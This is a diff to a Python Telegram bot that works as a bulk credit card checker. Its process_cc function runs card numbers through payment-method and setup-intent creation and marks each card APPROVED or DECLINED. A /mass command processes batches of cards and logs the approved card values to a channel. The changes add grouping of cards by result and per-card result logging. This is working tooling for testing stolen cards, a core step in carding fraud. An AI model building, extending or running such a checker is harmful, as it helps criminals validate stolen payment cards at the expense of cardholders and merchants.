@@ -42,7 +42,7 @@ if not LOG_CHANNEL_ID:
 app = None
 file_lock = threading.Lock()
 
-# Function to chunk large messages for Telegram's limits
+# NEW FUNCTION: Function to chunk large messages for Telegram's limits
 def chunk_message(message, max_length=4000):
     if len(message) <= max_length:
         return [message]
@@ -147,12 +147,9 @@ async def log_system_event(event_type: str, details: str, bot: Bot = None):
     if bot:
         await log_to_channel(log_message, bot)
 
+# NEW FUNCTION: Log detailed results of mass checks
 async def log_mass_check_results(approved_cards, declined_cards, error_cards, user_info, bot):
     """Log the results of a mass check operation to the log channel"""
-
-    # First, log the summary
-    summary = f"User {user_info.get('name', 'Unknown')} completed mass check: {len(approved_cards)} approved, {len(declined_cards)} declined, {len(error_cards)} errors"
-    await log_system_event("MASSCHECKCOMPLETE", summary, bot)
 
     # Log approved cards
     if approved_cards:
@@ -306,7 +303,7 @@ def process_cc(ccc):
             timer = round(time.time() - start_time, 1)
             return {
                 'status': 'DECLINED',
-                'message': f"Payment method creation failed",
+                'message': "Payment method creation failed",
                 'card': ccc,
                 'time': timer
             }
@@ -316,7 +313,7 @@ def process_cc(ccc):
             timer = round(time.time() - start_time, 1)
             return {
                 'status': 'DECLINED',
-                'message': f"Setup intent creation failed",
+                'message': "Setup intent creation failed",
                 'card': ccc,
                 'time': timer
             }
@@ -328,7 +325,7 @@ def process_cc(ccc):
                 timer = round(time.time() - start_time, 1)
                 return {
                     'status': 'APPROVED',
-                    'message': f"Card successfully verified",
+                    'message': "Card successfully verified",
                     'card': ccc,
                     'time': timer
                 }
@@ -346,7 +343,7 @@ def process_cc(ccc):
         timer = round(time.time() - start_time, 1)
         return {
             'status': 'DECLINED',
-            'message': f"General processing failure",
+            'message': "General processing failure",
             'card': ccc,
             'time': timer
         }
@@ -360,51 +357,9 @@ def process_cc(ccc):
             'time': timer
         }
 
-# Your existing command handlers
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Welcome! Send /help to see available commands.")
-
-async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    help_text = """
-Available commands:
-/check <card> - Check a single card
-/mass - Check multiple cards (reply to a message with cards)
-/help - Show this help message
-"""
-    await update.message.reply_text(help_text)
-
-async def check_card(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not context.args:
-        await update.message.reply_text("Please provide a card to check.")
-        return
-
-    card = context.args[0]
-    user_info = {
-        'id': update.effective_user.id,
-        'name': update.effective_user.full_name,
-        'username': update.effective_user.username
-    }
-
-    await update.message.reply_text(f"Checking card: {card}")
-
-    try:
-        result = process_cc(card)
-
-        # Log the result
-        await log_card_processing(card, result, user_info, context.bot)
-
-        # Format response based on status
-        if result['status'] == 'APPROVED':
-            response = f"✅ APPROVED: {result['message']}\n⏱️ Time: {result['time']}s"
-        else:
-            response = f"❌ DECLINED: {result['message']}\n⏱️ Time: {result['time']}s"
-
-        await update.message.reply_text(response)
-
-    except Exception as e:
-        await update.message.reply_text(f"Error: {str(e)}")
-
-async def mass_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
+# MODIFY YOUR EXISTING /mass COMMAND HANDLER TO INCLUDE THIS CODE:
+async def cmd_mass(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Process multiple cards at once"""
     user = update.effective_user
     user_info = {
         'id': user.id,
@@ -433,7 +388,7 @@ async def mass_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Log user interaction
     await log_user_interaction(update, "Mass Check", f"Submitted {len(cards)} cards for checking")
 
-    # Initialize lists to store results by category
+    # NEW CODE: Initialize lists to store results by category
     approved_cards = []
     declined_cards = []
     error_cards = []
@@ -447,6 +402,7 @@ async def mass_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
         try:
             result = process_cc(card)
 
+            # NEW CODE: Collect cards by category
             if result['status'] == 'APPROVED':
                 approved_cards.append((card, result))
             elif result['status'] == 'DECLINED':
@@ -463,7 +419,7 @@ async def mass_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 'time': 0.0
             }))
 
-    # Log detailed results to the log channel
+    # NEW CODE: Log detailed results to the log channel
     await log_mass_check_results(
         approved_cards,
         declined_cards,
@@ -471,6 +427,10 @@ async def mass_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_info,
         context.bot
     )
+
+    # Log the summary
+    summary = f"User {user.full_name} completed mass check: {len(approved_cards)} approved, {len(declined_cards)} declined, {len(error_cards)} errors"
+    await log_system_event("MASSCHECKCOMPLETE", summary, context.bot)
 
     # Update the user with a summary
     await processing_msg.edit_text(
@@ -480,23 +440,36 @@ async def mass_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"⚠️ Errors: {len(error_cards)}"
     )
 
+# Keep your existing initialization and app setup code unchanged
+
+# Initialize and run the bot
 async def main():
-    # Initialize the Application
-    application = Application.builder().token(BOT_TOKEN).build()
+    global app
+    app = Application.builder().token(BOT_TOKEN).build()
 
-    # Add handlers
-    application.add_handler(CommandHandler("start", start))
-    application.add_handler(CommandHandler("help", help_command))
-    application.add_handler(CommandHandler("check", check_card))
-    application.add_handler(CommandHandler("mass", mass_check))
+    # Command handlers
+    app.add_handler(CommandHandler("mass", cmd_mass))
 
-    # Start the Bot
-    await application.initialize()
-    await application.start()
-    await application.updater.start_polling()
+    # Add other command handlers as needed...
 
-    # Run the bot until the user presses Ctrl-C
-    await application.idle()
+    # Start the bot
+    await app.initialize()
+    await app.start()
+    await app.updater.start_polling()
+
+    # Run the bot until user interrupts
+    await app.idle()
+
+# Graceful shutdown handler
+def signal_handler(sig, frame):
+    logger.info("Received signal to terminate. Shutting down gracefully...")
+    if app:
+        asyncio.run(app.stop())
+    sys.exit(0)
+
+# Register signal handlers
+signal.signal(signal.SIGINT, signal_handler)
+signal.signal(signal.SIGTERM, signal_handler)
 
 if __name__ == "__main__":
     asyncio.run(main())
